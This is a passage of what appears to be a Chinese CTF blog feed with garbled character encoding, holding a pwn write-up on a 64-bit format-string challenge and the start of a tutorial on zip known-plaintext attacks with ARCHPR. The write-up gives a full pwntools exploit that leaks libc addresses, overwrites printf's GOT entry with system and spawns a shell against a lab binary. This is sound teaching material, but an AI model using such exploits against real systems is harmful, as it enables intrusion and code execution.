href="#åˆ©ç”¨-libc-åç§»è®¡ç®—-system-åœ°å€-1" class="headerlink" title="åˆ©ç”¨ libc åç§»è®¡ç®— system åœ°å€"></a>åˆ©ç”¨ libc åç§»è®¡ç®— system åœ°å€</h2><p>è¦ä½¿ç”¨ libc è®¡ç®—åç§»ï¼Œé¦–å…ˆéœ€è¦çŸ¥é“ä¸€ä¸ªè°ƒç”¨è‡ª libc çš„å‡½æ•°çš„çœŸå®åœ°å€</p><p>è¿™é‡Œè¿˜æ˜¯é€‰æ‹©é€šè¿‡ <code>puts_got_addr</code> æ³„éœ²çœŸå® <code>puts()</code> åœ°å€ä½œä¸ºç¤ºä¾‹</p><blockquote><p><em>æ³¨æ„ï¼šè¿™é‡Œä¸ 32 ä½ç¨‹åºæœ‰æ‰€ä¸åŒï¼ï¼ï¼</em></p><p><mark>å¦‚æœä¾ç„¶ä½¿ç”¨ç±»ä¼¼äº 32 ä½ç¨‹åºä¸­çš„æ–¹æ³•ï¼Œåœ¨æ¥æ”¶åœ°å€æ—¶ä¼šå‘ç”Ÿé”™è¯¯ï¼š</mark></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># åˆ©ç”¨ puts å‡½æ•°çš„ GOT è¡¨åœ°å€æ³„éœ² puts å‡½æ•°çš„çœŸå®åœ°å€</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%6$s'</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>  puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶è¯´æˆ‘ä»¬æ¥æ”¶åˆ°çš„æ•°æ® <code>0x3a7475706e69</code> æ¥è‡ª <code>69 6e 70 75 74 3a</code>ï¼ˆå°ç«¯åºï¼‰æ²¡æœ‰é—®é¢˜ï¼Œä½†å®é™…ä¸Š <code>puts()</code> çš„çœŸå®åœ°å€æ˜¯é”™è¯¯çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_21.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_22.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_22.png"></p><p>åŸå› åœ¨äºï¼š</p><ul><li><strong>32 ä½ç¨‹åºçš„åœ°å€å  4 å­—èŠ‚ï¼Œé€šå¸¸ 4 å­—èŠ‚å…¨éƒ¨è¢«ä½¿ç”¨</strong></li><li><strong>64 ä½ç¨‹åºçš„åœ°å€è™½ç„¶å  8 å­—èŠ‚ï¼Œä½†é€šå¸¸åªä½¿ç”¨äº†å…¶ä¸­çš„ 6 å­—èŠ‚</strong></li></ul><p>å®é™… <code>puts_got_addr</code> çš„åœ°å€ <code>0x56c4b37f8020</code> åªä½¿ç”¨äº† 6 å­—èŠ‚ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬åœ¨å‘é€ <code>p64(puts_got_addr)</code> çš„æ—¶å€™ï¼Œé«˜ä½ 2 å­—èŠ‚è¢«è¡¥ä¸º <code>0x00</code>ï¼Œæœ€åçš„åœ°å€ä¸ºï¼š<code>0x000056c4b37f8020</code></p><p>å³ä¸Šå›¾æ¡ƒçº¢è‰²æ–¹æ¡†ä¸­çš„ï¼š<code>20 80 7f b3 c4 56 00 00</code>ï¼ˆå°ç«¯åºï¼‰</p><p>è€Œè¿™é‡Œçš„ <code>0x00</code> ä¼šå¯¼è‡´æˆ‘ä»¬å‘é€çš„ payload è¢«æˆªæ–­ï¼Œå› æ­¤æ— æ³•è¾¾åˆ° <code>printf(%6$s)</code> çš„æ•ˆæœ</p></blockquote><p>æ‰€ä»¥è¿™é‡Œä¸ºäº†é¿å…è¢«æˆªæ–­ï¼Œæˆ‘ä»¬ä¸èƒ½åœ¨ <code>%å‚æ•°é¡ºåº$æ ¼å¼åŒ–è¯´æ˜ç¬¦</code> ä¹‹å‰å‘é€ <code>p64(puts_got_addr)</code></p><p>åº”è¯¥å…ˆå‘é€ <code>%å‚æ•°é¡ºåº$æ ¼å¼åŒ–è¯´æ˜ç¬¦</code>ï¼Œå†å‘é€ <code>p64(puts_got_addr)</code></p><p>äºæ˜¯æ ˆä¸­çš„ç»“æ„åº”è¯¥å˜ä¸ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_23.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_23.png"></p><p>å› ä¸ºå…ˆå‘é€ <code>%å‚æ•°é¡ºåº$æ ¼å¼åŒ–è¯´æ˜ç¬¦</code>ï¼Œæ‰€ä»¥ <code>p64(puts_got_addr)</code> åº”è¯¥ä½äºç¬¬ 7 ä¸ªä½ç½®ï¼Œå°†åŸæ¥çš„ <code>b&#39;%6$s&#39;</code> æ”¹ä¸º <code>b&#39;%7$s&#39;</code></p><p><strong>åŒæ—¶ï¼Œ64 ä½ç¨‹åºä¸€ä¸ªåœ°å€å­˜æ”¾ 8 å­—èŠ‚ï¼Œè€Œ <code>b&#39;%7$s&#39;</code> åªæœ‰ 4 å­—èŠ‚ï¼Œå› æ­¤è¿˜éœ€è¦å¡«è¡¥ 4 å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œä¾‹å¦‚ï¼š<code>b&#39;%7$saaaa&#39;</code></strong></p><p>å› æ­¤è„šæœ¬åº”è¯¥æ”¹ä¸ºï¼š</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># åˆ©ç”¨ puts å‡½æ•°çš„ GOT è¡¨åœ°å€æ³„éœ² puts å‡½æ•°çš„çœŸå®åœ°å€</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># æ­¤æ—¶æ³„æ¼çš„åœ°å€ä½äºæœ€å¼€å§‹ï¼Œå› æ­¤ç›´æ¥ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ¥æ”¶</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_24.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_24.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_25.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_25.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ¬¡æ²¡æœ‰è¢« <code>0x00</code> æˆªæ–­ï¼Œ<code>puts()</code> çš„çœŸå®åœ°å€ä¹Ÿæ˜¯æ­£ç¡®çš„</p><p>å…¶ä»–çš„åŸºæœ¬ä¸ 32 ä½ä¸€æ ·ï¼Œæœ€åä½¿ç”¨ <code>fmtstr_payload()</code> æ—¶å°†åç§»æ”¹ä¸º 6 å³å¯</p><h2 id="å®Œæ•´è„šæœ¬-1"><a href="#å®Œæ•´è„šæœ¬-1" class="headerlink" title="å®Œæ•´è„šæœ¬"></a>å®Œæ•´è„šæœ¬</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># æ³„éœ²å¹¶è®¡ç®— main å‡½æ•°çœŸå®åœ°å€</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® main å‡½æ•°çš„çœŸå®åœ°å€è®¡ç®— puts å‡½æ•°çš„ GOT è¡¨åœ°å€</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># åˆ©ç”¨ puts å‡½æ•°çš„ GOT è¡¨åœ°å€æ³„éœ² puts å‡½æ•°çš„çœŸå®åœ°å€</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># æ­¤æ—¶æ³„æ¼çš„åœ°å€ä½äºæœ€å¼€å§‹ï¼Œå› æ­¤ç›´æ¥ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ¥æ”¶</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® puts å‡½æ•°çš„çœŸå®åœ°å€ä¸ libc åç§»è®¡ç®— system å‡½æ•°åœ°å€</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç»“æœ-1"><a href="#ç»“æœ-1" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_26.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_26.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_27.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_27.png"></p>]]></content>
    
    
    <summary type="html">ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ä¾‹é¢˜ï¼ŒåŒ…æ‹¬æ³„éœ²æ ˆç©ºé—´çš„æ•°æ®ã€é€šè¿‡æ ˆä¸Šçš„è¿”å›åœ°å€æ¨ç®—å…¶å®ƒå‡½æ•°çš„çœŸå®åœ°å€ã€åˆ©ç”¨ libc åç§»è®¡ç®— system ä¸ &quot;/bin/sh&quot;ï¼Œä»¥åŠé€šè¿‡ fmtstr_payload å°† printf çš„ GOT è¡¨åœ°å€ä¿®æ”¹ä¸º system_pltï¼Œéœ€æ³¨æ„ 32 ä½ä¸ 64 ä½çš„åŒºåˆ«</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="æ ¼å¼åŒ–å­—ç¬¦ä¸²" scheme="https://www.uf4te.cn/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>æ˜æ–‡æ”»å‡»</title>
    <link href="https://www.uf4te.cn/posts/3a71eb8.html"/>
    <id>https://www.uf4te.cn/posts/3a71eb8.html</id>
    <published>2024-04-09T02:52:54.000Z</published>
    <updated>2024-06-05T06:34:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zip-æ˜æ–‡æ”»å‡»"><a href="#zip-æ˜æ–‡æ”»å‡»" class="headerlink" title="zip æ˜æ–‡æ”»å‡»"></a>zip æ˜æ–‡æ”»å‡»</h1><blockquote><p>zip æ˜æ–‡æ”»å‡»æ˜¯é’ˆå¯¹åŠ å¯† zip å‹ç¼©åŒ…çš„ä¸€ç§é«˜æ•ˆæ”»å‡»æ‰‹æ®µï¼Œç”±äºåŒä¸€ä¸ª zip å‹ç¼©åŒ…é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†å¯†é’¥æ¥åŠ å¯†çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨å‹ç¼©åŒ…ä¸­çš„æŸä¸ªå·²çŸ¥æ–‡ä»¶ï¼Œåœ¨ä¸çŸ¥é“è§£å‹å¯†ç çš„æƒ…å†µä¸‹è¿˜åŸå‡ºå‹ç¼©åŒ…ä¸­çš„æ‰€æœ‰æ–‡ä»¶</p><p><em>zip ä¼ ç»ŸåŠ å¯†ç®—æ³•æœ¬è´¨ä¸Šæ˜¯ä¼ªéšæœºæ•°æµå’Œæ˜æ–‡è¿›è¡Œå¼‚æˆ–ï¼Œäº§ç”Ÿè¿™ä¸ªä¼ªéšæœºæµéœ€è¦ç”¨åˆ° 3 ä¸ª 32 bits çš„ keyï¼Œæ‰¾åˆ°è¿™ 3 ä¸ª keyï¼Œå°±èƒ½è§£å¼€åŠ å¯†çš„æ–‡ä»¶</em>ã€‚å¦‚æœå¯ä»¥è·å¾—åŠ å¯†å‹ç¼©åŒ…ä¸­çš„ä»»æ„ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨åŒæ ·çš„å‹ç¼©æ–¹æ³•è¿›è¡Œæ— å¯†ç çš„å‹ç¼©ï¼Œåˆ†ææ— å¯†ç  zip å’Œæœ‰å¯†ç  zip çš„ä¸åŒä¹‹å¤„å°±èƒ½å¾—åˆ° 3 ä¸ª keyï¼Œè¿›è€Œåœ¨ä¸çŸ¥é“è§£å‹å¯†ç çš„æƒ…å†µä¸‹è·å–åŠ å¯†å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶</p></blockquote><h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><blockquote><p><strong>ä½¿ç”¨ ARCHPR è¿›è¡Œæ˜æ–‡æ”»å‡»æ—¶ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šæ˜æ–‡æ–‡ä»¶ä¸åŠ å¯†çš„ zip å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶æ˜¯å¦ä¸ºåŒä¸€ä¸ªæ–‡ä»¶</strong>ï¼Œå¦å¤–ï¼Œ<mark>å‹ç¼©åŒ…è¦é‡‡ç”¨ ZipCrypto ç±»ï¼ˆå¦‚ï¼šStoreï¼‰ç®—æ³•ï¼Œä¸èƒ½é‡‡ç”¨ AES-256 åŠ å¯†</mark></p></blockquote><h3 id="ç¡®å®šæ˜æ–‡æ–‡ä»¶"><a href="#ç¡®å®šæ˜æ–‡æ–‡ä»¶" class="headerlink" title="ç¡®å®šæ˜æ–‡æ–‡ä»¶"></a>ç¡®å®šæ˜æ–‡æ–‡ä»¶</h3><p>ä¾‹å¦‚ï¼Œè·å–åˆ°ä¸€ä¸ªæ²¡æœ‰å¯†ç çš„æ˜æ–‡æ–‡ä»¶ <code>readme.txt</code>ï¼Œä¸”æ–‡ä»¶å¤§å°å¤§äºÂ 12 Byteï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB2.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»2.png"></p><p>å‘ç°åŠ å¯†çš„å‹ç¼©åŒ… <code>Desktop.zip</code> ä¸­åŒæ ·æœ‰ä¸€ä¸ªåä¸º <code>readme.txt</code> çš„æ–‡ä»¶</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB3.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»3.png"></p><p><strong>ä¸ºäº†ç¡®å®šå®ƒä»¬æ˜¯å¦æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ WinRARã€7-Zip ç­‰è§£å‹è½¯ä»¶æ¥æŸ¥çœ‹ CRC å€¼</strong></p><p>å¯ä»¥çœ‹åˆ°åŠ å¯†çš„ <code>Desktop.zip</code> ä¸­ <code>readme.txt</code> çš„ CRC å€¼ä¸º <code>E615BDA4</code>ï¼Œç®—æ³•ä¸º <code>ZipCrypto Store</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB1.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»1.png"></p><p>ç„¶åå°† <code>readme.txt</code> å‹ç¼©ä¸º zip å‹ç¼©åŒ…ï¼ˆ<em>éœ€ä¸åŠ å¯†å‹ç¼©åŒ…å†…çš„ <code>readme.txt</code> å‹ç¼©æ ¼å¼ä¸€è‡´</em>ï¼‰ï¼Œæ–‡ä»¶åéšæ„ï¼Œæˆ‘è¿™é‡Œå‘½åä¸º <code>readme.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB4.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»4.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ª <code>readme.txt</code> æ–‡ä»¶çš„ CRC å€¼éƒ½æ˜¯ <code>E615BDA4</code>ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯åŒä¸€ä¸ªæ–‡ä»¶</p><hr><h3 id="ä½¿ç”¨-ARCHPR-æ˜æ–‡æ”»å‡»"><a href="#ä½¿ç”¨-ARCHPR-æ˜æ–‡æ”»å‡»" class="headerlink" title="ä½¿ç”¨ ARCHPR æ˜æ–‡æ”»å‡»"></a>ä½¿ç”¨ ARCHPR æ˜æ–‡æ”»å‡»</h3><p>æ‰“å¼€ ARCHPRï¼Œé€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œå¯¼å…¥å¯¹åº”æ–‡ä»¶</p><p><em>æ˜æ–‡æ–‡ä»¶å°±æ˜¯å°† <code>readme.txt</code> å‹ç¼©åçš„ <code>readme.zip</code></em></p><blockquote><p>å¦‚æœåœ¨ä½¿ç”¨æ˜æ–‡æ”»å‡»çš„æ—¶å€™ï¼ŒARCHPR å‡ºç°è¿™ç§æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åœ¨é€‰å®šçš„æ¡£æ¡ˆä¸­æ²¡æœ‰åŒ¹é…çš„æ–‡ä»¶ã€‚å¦‚æœæ‚¨æƒ³è¦ä»…ä½¿ç”¨æ–‡ä»¶çš„ä¸€éƒ¨åˆ†æ‰§è¡Œæ˜æ–‡æ”»å‡»ï¼Œè¯·ä¿®æ”¹æ¡£æ¡ˆï¼Œä½¿æ¯ä¸ªæ¡£æ¡ˆä¸­åªåŒ…å«ä¸€ä¸ªæ–‡ä»¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯èƒ½æ˜¯å‹ç¼©è½¯ä»¶çš„é—®é¢˜ï¼Œ<strong>æ„é€ æ˜æ–‡å‹ç¼©åŒ…æ—¶è¦é€‰ç”¨ä¸åŠ å¯†å‹ç¼©åŒ…ç›¸åŒçš„å‹ç¼©è½¯ä»¶ï¼Œä¾‹å¦‚åŠ å¯†å‹ç¼©åŒ…æ˜¯é€šè¿‡ WinRAR å‹ç¼©çš„ï¼Œç”¨ 7-Zip åˆ¶ä½œæ˜æ–‡å‹ç¼©åŒ…ï¼Œå¯èƒ½ä¼šå‡ºç°æŠ¥é”™çš„æƒ…å†µ</strong>ï¼Œè¯·å°è¯•æ›´æ¢å‹ç¼©è½¯ä»¶</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB5.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»5.png"></p><blockquote><p><mark>æ³¨æ„ï¼šè¿™é‡Œä¸éœ€è¦ç­‰åˆ° ARCHPR ç ´è§£çš„è¿›åº¦æ¡èµ°å®Œ</mark></p><p><strong>æ˜æ–‡æ”»å‡»æ—¶é•¿ä¸€èˆ¬åœ¨ 5 - 10 åˆ†é’Ÿï¼Œè¿è¡Œè‡³ 5 åˆ†é’Ÿå·¦å³å¯ä»¥æ‰‹åŠ¨åœæ­¢</strong></p></blockquote><p>å¦‚æœæ‰‹åŠ¨åœæ­¢æ—¶ ARCHPR è¿˜æ²¡æœ‰æ‰¾åˆ°å¯†é’¥ï¼Œåˆ™ä¼šæ˜¾ç¤ºâ€œè¢«ç”¨æˆ·ç»ˆæ­¢â€ï¼Œæ­¤æ—¶åªéœ€å†æ¬¡ç‚¹å‡»â€œå¼€å§‹â€ï¼Œç­‰å¾…å‡ åˆ†é’Ÿåå†æ¬¡æ‰‹åŠ¨åœæ­¢ï¼Œé‡å¤æ­¤æ“ä½œ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB8.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»8.png"></p><p>å¦‚æœæ‰‹åŠ¨åœæ­¢æ—¶ ARCHPR 